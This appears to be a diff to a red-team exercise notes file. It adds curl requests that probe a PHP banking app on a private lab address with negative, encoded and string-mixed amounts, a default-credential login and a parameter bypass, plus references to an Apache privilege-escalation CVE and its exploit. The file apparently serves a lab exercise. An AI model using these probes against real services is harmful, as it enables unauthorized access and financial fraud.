@@ -43,6 +43,22 @@ Red:
         curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=-1000&drop=withdraw"
         curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=%2D%31%30%30&drop=withdraw"
 
+        Send integer values in strings
+            curl "http://10.1.5.2/process.php?user=temp&pass=temp&amount=11temp22&drop=desposit"
+
     5. Check if default creadentials work
         curl "http://10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance"
+
+    6. Interesting
+    curl "http://10.1.5.2/process.php?user=aaa&pass=aaa&amount=-1&#45100&drop=balance" -> bypasses the drop=balance going to the default option.
         
+References for vulnerabilities:
+    https://www.cybersecurity-help.cz/vdb/SB2020102113
+    exploit-db => use searchsploit in Parrot and Kali
+
+    Apache httpd 2.4.29:
+        1. CVE-2019-0211 => Local Privilege Escalation (Useful is somehow we are able to gain access as a low privileged user)
+            https://www.cvedetails.com/cve/CVE-2019-0211/
+            https://www.exploit-db.com/exploits/46676
+
+        2. 
